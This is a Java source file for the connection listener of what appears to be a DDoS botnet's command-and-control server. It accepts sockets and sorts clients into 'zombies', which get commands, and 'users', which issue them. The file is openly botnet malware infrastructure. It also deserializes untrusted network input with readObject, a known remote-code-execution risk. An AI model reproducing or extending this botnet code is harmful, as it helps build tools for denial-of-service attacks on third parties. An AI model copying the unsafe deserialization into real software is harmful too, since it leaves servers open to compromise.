/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ddosserver;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * Listens for connections from either Zombies or Users
 * @author karol
 */
public class ConnectionListener implements Runnable{
    
    private DdosServer server;
    
    public ConnectionListener(DdosServer server){
        this.server = server;
    }

    @Override
    public void run() {
        try{
            while (true){
                System.out.println("Connection listener waiting for connection.");

                //Listen for incoming connections
                Socket clientSocket = server.getSocket().accept();

                //Establishing input and output stream
                 ObjectOutputStream out = new ObjectOutputStream(
                    clientSocket.getOutputStream());
                 ObjectInputStream in = new ObjectInputStream(
                    clientSocket.getInputStream());   

                 //Get identifier
                 Identifier identifier = (Identifier)in.readObject();
                 
                 //Check whether zombie or user
                 if (identifier.isZombie()){
                     server.addZombie(out);
                 }
                 else{
                     server.addUser(in);
                 }
                 
                 System.out.println("Connection established successfully, isZombie():"+identifier.isZombie());
            }
        }
        catch(Exception e){
            e.printStackTrace();
        }
    }
    
    
    
}
